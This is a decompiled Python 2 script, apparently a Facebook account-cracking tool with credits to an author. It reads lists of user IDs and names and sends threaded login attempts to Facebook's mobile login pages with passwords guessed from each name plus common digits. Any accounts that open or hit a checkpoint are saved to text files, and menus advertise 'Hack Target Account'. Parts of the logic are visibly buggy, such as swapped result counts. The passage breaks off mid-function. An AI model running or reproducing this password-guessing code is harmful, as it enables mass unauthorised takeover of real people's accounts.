# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-03-09 20:42:43.362925
import os, time, requests, datetime, random, multiprocessing.pool, getpass, json, threading, sys, uuid, shutil, zlib, base64
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

l1 = '100077'
l2 = '100078'
os.system('rm -rf token.txt')
g = '\x1b[1;92m'
r = '\x1b[1;91m'
w = '\x1b[1;97m'
y = '\x1b[1;93m'
n = '\x1b[1;94m'
gu = '\x1b[1;95m'
sm = '\x1b[1;96m'
try:
    import lolcat
except:
    os.system('pip2 install lolcat')

logo = '\n\x1b[1;97m$$$$$$$\\   $$$$$$\\  $$\\   $$\\  $$$$$$\\  \n\x1b[1;91m$$  __$$\\ $$  __$$\\ $$$\\  $$ |$$  __$$\\ \n\x1b[1;91m$$ |  $$ |$$ /  $$ |$$$$\\ $$ |$$ /  $$ |\n\x1b[1;97m$$$$$$$  |$$$$$$$$ |$$ $$\\$$ |$$$$$$$$ |\n\x1b[1;97m$$  __$$< $$  __$$ |$$ \\$$$$ |$$  __$$ |\n\x1b[1;91m$$ |  $$ |$$ |  $$ |$$ |\\$$$ |$$ |  $$ |\n\x1b[1;91m$$ |  $$ |$$ |  $$ |$$ | \\$$ |$$ |  $$ |\n\x1b[1;97m\\__|  \\__|\\__|  \\__|\\__|  \\__|\\__|  \\__|\n\x1b[1;97m------------------------------------------------\n\x1b[1;91m[]\x1b[1;97mAuthor  : Rana Nadeem Rajput  \n\x1b[1;91m[]\x1b[1;97mGithub  : Rananadeem5214\n\x1b[1;91m[]\x1b[1;97mFb ID   : ITXRANA.5214\n\x1b[1;97m------------------------------------------------\n                                                 '
dec = '2'
server = '2'
ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
fuck = []
idx = []
oks = []
cps = []

def s():
    os.system('clear')
    print logo
    print '\x1b[1;91m[1]\x1b[1;97m CRACK From File\x1b[1;91m        [Method 1]'
    print '\x1b[1;91m[2]\x1b[1;97m CRACK From File\x1b[1;91m        [Method 2]'
    print '\x1b[1;91m[3]\x1b[1;97m CRACK From File\x1b[1;91m        [Method 3]'
    print '\x1b[1;91m[4]\x1b[1;97m CRACK From Public id \x1b[1;91m '
    print '\x1b[1;91m[5]\x1b[1;97m CRACK From Multi Idz\x1b[1;91m            '
    print '\x1b[1;91m[6]\x1b[1;97m File Making Automatic\x1b[1;91m'
    print '\x1b[1;91m[7]\x1b[1;97m Remove Double Link In File\x1b[1;91m   '
    print '\x1b[1;91m[8]\x1b[1;97m Random Number Cloning\x1b[1;91m   '
    print '\x1b[1;91m[9]\x1b[1;97m Hack Target Account\x1b[1;91m   '
    print '\x1b[1;91m[0]\x1b[1;97m Back'
    print '\x1b[1;97m------------------------------------------------'
    s_option()


def s_option():
    select = raw_input('\x1b[1;97mChoose  ')
    if select == '1':
        menu()
    if select == '2':
        menu2()
    if select == '3':
        menu3()
    if select == '4':
        os.system('python2 public.py')
    if select == '5':
        os.system('python2 multi.py')
    if select == '6':
        grab_auto()
    if select == '7':
        grab_links()
    if select == '8':
        os.system('python2 without.py')
    if select == '9':
        os.system('python2 target.py')
    if select == '0':
        sb()
    else:
        print '\tSelect valid option'
        s_option()


def menu():
    os.system('clear')
    print logo
    print '\x1b[1;91m[1]\x1b[1;97m Crack With Auto Pass'
    print '\x1b[1;91m[2]\x1b[1;97m Crack With Choice Pass'
    print '\x1b[1;91m[0]\x1b[1;97m Back'
    print '\x1b[1;97m------------------------------------------------'
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;97mChoose ---> ')
    if select == '1':
        fileauto()
    elif select == '2':
        n_f_p_pass()
    elif select == '0':
        s()
    else:
        print '\tSelect valid option'
        menu_option()


def fileauto():
    os.system('clear')
    print logo
    print ''
    print ''
    try:
        mf = raw_input('\x1b[1;91m[!]\x1b[1;97mEnter File : ')
        print '\x1b[1;97m------------------------------------------------'
        for line in open(mf, 'r').readlines():
            idx.append(line.strip())

    except:
        print 'file not found'
        time.sleep(2)
        menu()

    print '\x1b[1;91m[!]\x1b[1;97mTotal ids : ' + str(len(idx))
    print '\x1b[1;97m------------------------------------------------'
    print '\x1b[1;91m[!]\x1b[1;97mCloning Start Now please Wait ..'
    print '\x1b[1;91m[!]\x1b[1;97mFor Stop press ctrl+z...'
    print '\x1b[1;91m[!]\x1b[1;97mOn Flight Mode Every 5 mints for 5 Secnds'
    print '\x1b[1;97m------------------------------------------------'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        name = name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass

        lines = random.choice([
         'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
         'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
         'Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
         'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'https://free.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://free.facebook.com')
            b = rana.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass1
                ok = open('RYDAH-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[RYDAH-CP] ' + uid + ' | ' + pass1
                cp = open('RYDAH-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = first + '123'
                rana = requests.Session()
                rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = rana.get('https://mbasic.facebook.com')
                b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass2
                    ok = open('RYDAH-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[RYDAH-CP] ' + uid + ' | ' + pass2
                    cp = open('RYDAH-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = first + 'last'
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass3
                        ok = open('RYDAH-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;97m[RYDAH-CP] ' + uid + ' | ' + pass3
                        cp = open('RYDAH-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = first + '12345'
                        rana = requests.Session()
                        rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                        p = rana.get('https://mbasic.facebook.com')
                        b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass4
                            ok = open('RYDAH-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;97m[RYDAH-CP] ' + uid + ' | ' + pass4
                            cp = open('RYDAH-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = first + '786'
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass5
                                ok = open('RYDAH-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;97m[RYDAH-CP] ' + uid + ' | ' + pass5
                                cp = open('RYDAH-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, idx)
    print '\x1b[1;97m'
    print '\x1b[1;91m[!]\x1b[1;97m Cloning Complete Result ........'
    print '\x1b[1;97m------------------------------------------------'
    print '\x1b[1;91m[!]\x1b[1;97mTotal ok ids : ' + str(len(cps))
    print '\x1b[1;91m[!]\x1b[1;97mTotal cp ids : ' + str(len(oks))
    print '\x1b[1;97m------------------------------------------------'
    print ''
    raw_input(' Press enter to back ')
    menu()


def n_f_p_pass():
    os.system('clear')
    print logo
    print ''
    print 'Example 123 + 1234 + 12345 + 786'
    print ''
    ps1 = raw_input('\x1b[1;91m[1]\x1b[1;97mName + digit : ')
    ps2 = raw_input('\x1b[1;91m[2]\x1b[1;97mName + digit : ')
    ps3 = raw_input('\x1b[1;91m[3]\x1b[1;97mName + digit : ')
    ps4 = raw_input('\x1b[1;91m[4]\x1b[1;97mName + digit : ')
    print ''
    try:
        mf = raw_input('\x1b[1;91m[]\x1b[1;97mEnter File : ')
        print '\x1b[1;97m------------------------------------------------'
        for line in open(mf, 'r').readlines():
            idx.append(line.strip())

    except:
        print 'file not found'
        time.sleep(2)
        menu()

    print '\x1b[1;91m[!]\x1b[1;97mTotal ids : ' + str(len(idx))
    print '\x1b[1;97m------------------------------------------------'
    print '\x1b[1;91m[!]\x1b[1;97mCloning Start Now please Wait ..'
    print '\x1b[1;91m[!]\x1b[1;97mFor Stop press ctrl+z...'
    print '\x1b[1;91m[!]\x1b[1;97mOn Flight Mode Every 5 mints for 5 Secnds'
    print '\x1b[1;97m------------------------------------------------'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        name = name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass

        lines = random.choice([
         'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]NokiaX2-00/5.0 (04.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass1
                ok = open('RYDAH-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass1
                cp = open('RYDAH-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = first + ps1
                rana = requests.Session()
                rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = rana.get('https://mbasic.facebook.com')
                b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass2
                    ok = open('RYDAH-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass2
                    cp = open('RYDAH-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = first + ps2
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass3
                        ok = open('RYDAH-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass3
                        cp = open('RYDAH-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = first + ps3
                        rana = requests.Session()
                        rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                        p = rana.get('https://mbasic.facebook.com')
                        b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass4
                            ok = open('RYDAH-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass4
                            cp = open('RYDAH-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = first + ps4
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass5
                                ok = open('RYDAH-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass5
                                cp = open('RYDAH-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, idx)
    print '\x1b[1;97m'
    print '\x1b[1;91m[!]\x1b[1;97mCloning Complete Result ........'
    print '\x1b[1;97m------------------------------------------------'
    print '\x1b[1;91m[!]\x1b[1;97mTotal Ok Ids : ' + str(len(oks))
    print '\x1b[1;91m[!]\x1b[1;97mTotal Cp Ids: ' + str(len(cps))
    print '\x1b[1;97m------------------------------------------------'
    print ''
    raw_input(' Press Enter To Back ')
    menu()


def menu2():
    os.system('clear')
    print logo
    print '\x1b[1;91m[1]\x1b[1;97m Crack With Auto Pass'
    print '\x1b[1;91m[0]\x1b[1;97m Back'
    print '\x1b[1;97m------------------------------------------------'
    menu2_option()


def menu2_option():
    select = raw_input('\x1b[1;97mChoose ---> ')
    if select == '1':
        crackc()
    elif select == '0':
        s()


def crackc():
    os.system('clear')
    print logo
    print ''
    print ''
    try:
        mf = raw_input('\x1b[1;91m[!]\x1b[1;97mEnter File : ')
        print '\x1b[1;97m------------------------------------------------'
        for line in open(mf, 'r').readlines():
            idx.append(line.strip())

    except:
        print 'file not found'
        time.sleep(2)
        menu2()

    print '\x1b[1;91m[!]\x1b[1;97m Total ids : ' + str(len(idx))
    print '\x1b[1;97m------------------------------------------------'
    print '\x1b[1;91m[!]\x1b[1;97mCloning Start Now please Wait ..'
    print '\x1b[1;91m[!]\x1b[1;97mFor Stop press ctrl+z...'
    print '\x1b[1;91m[!]\x1b[1;97mTurn on Flight Mode Every 5 mints for 5 Secnds'
    print '\x1b[1;97m------------------------------------------------'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        name = name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass

        lines = random.choice([
         'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]NokiaX2-00/5.0 (04.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass1
                ok = open('RYDAH-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass1
                cp = open('RYDAH-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = first + '123'
                rana = requests.Session()
                rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = rana.get('https://mbasic.facebook.com')
                b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass2
                    ok = open('RYDAH-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass2
                    cp = open('RYDAH-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = first + 'last'
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass3
                        ok = open('RYDAH-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass3
                        cp = open('RYDAH-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = first + '12345'
                        rana = requests.Session()
                        rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                        p = rana.get('https://mbasic.facebook.com')
                        b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass4
                            ok = open('RYDAH-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass4
                            cp = open('RYDAH-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = first + '786'
                            rana = requests.Session()
                            rana.headers.update({'Host': 'b-api.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass5
                                ok = open('RYDAH-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass5
                                cp = open('RYDAH-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, idx)
    print '\x1b[1;97m'
    print '\x1b[1;91m[!]\x1b[1;97m Cloning Complete Result ........'
    print '\x1b[1;97m------------------------------------------------'
    print '\x1b[1;91m[!]\x1b[1;97mTotal ok ids : ' + str(len(cps))
    print '\x1b[1;91m[!]\x1b[1;97mTotal cp ids : ' + str(len(oks))
    print '\x1b[1;97m------------------------------------------------'
    print ''
    raw_input(' Press enter to back ')
    menu2()


def menu3():
    os.system('clear')
    print logo
    print '\x1b[1;91m[1]\x1b[1;97m Crack With Auto Pass'
    print '\x1b[1;91m[0]\x1b[1;97m Back'
    print '\x1b[1;97m------------------------------------------------'
    menu3_option()


def menu3_option():
    select = raw_input('\x1b[1;97mChoose ---> ')
    if select == '1':
        cracko()
    elif select == '0':
        s()


def cracko():
    os.system('clear')
    print logo
    print ''
    print ''
    try:
        mf = raw_input('\x1b[1;91m[!]\x1b[1;97mEnter File : ')
        print '\x1b[1;97m------------------------------------------------'
        for line in open(mf, 'r').readlines():
            idx.append(line.strip())

    except:
        print 'file not found'
        time.sleep(2)
        menu3()

    print '\x1b[1;91m[!]\x1b[1;97m Total ids : ' + str(len(idx))
